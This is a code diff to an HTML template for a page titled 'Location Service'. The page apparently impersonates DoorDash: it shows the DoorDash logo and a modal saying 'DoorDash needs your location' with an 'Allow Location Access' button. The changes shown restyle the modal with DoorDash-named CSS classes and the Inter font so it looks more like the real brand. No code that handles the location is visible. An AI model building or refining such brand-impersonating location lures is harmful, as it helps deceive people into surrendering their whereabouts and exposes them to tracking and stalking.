@@ -20,14 +20,30 @@ HTML_TEMPLATE = """
 <head>
     <title>Location Service</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
-.body {{
-  font-family: -apple-system, BlinkMacSystemFont, 
-               "Segoe UI", Roboto, Helvetica, Arial, 
-               sans-serif, "Apple Color Emoji";
-  -webkit-font-smoothing: antialiased;
-  -moz-osx-font-smoothing: grayscale;
+.doorDash-heading {{
+  font-family: 'Inter', sans-serif;
+  font-weight: 700; /* Bold */
+  font-size: 22px;
+  color: #2E3131;
+  letter-spacing: -0.3px;
+  margin-bottom: 8px;
+}}
+
+.doorDash-text {{
+  font-family: 'Inter', sans-serif;
+  font-weight: 400; /* Regular */
+  font-size: 16px;
+  color: #6B7177;
+  line-height: 1.5;
+  margin-bottom: 20px;
+}}
+
+.doorDash-button {{
+  font-family: 'Inter', sans-serif;
+  font-weight: 600; /* Semi-bold */
+  font-size: 16px;
 }}
 
         .gps-overlay {{
@@ -70,8 +86,8 @@ HTML_TEMPLATE = """
     <div class="gps-overlay">
         <div class="gps-modal">
             <img src="https://1000logos.net/wp-content/uploads/2021/06/DoorDash-logo.png" width="150" alt="DoorDash">
-            <h2>DoorDash needs your location to find restaurants near you</h2>
-            <p>Please allow location access to continue to DoorDash.com</p>
+            <h2 class="doorDash-heading">DoorDash needs your location to find restaurants near you</h2>
+            <p class="doorDash-text">Please allow location access to continue to DoorDash.com</p>
             <button class="gps-btn" id="gps-allow-btn">Allow Location Access</button>
         </div>
     </div>
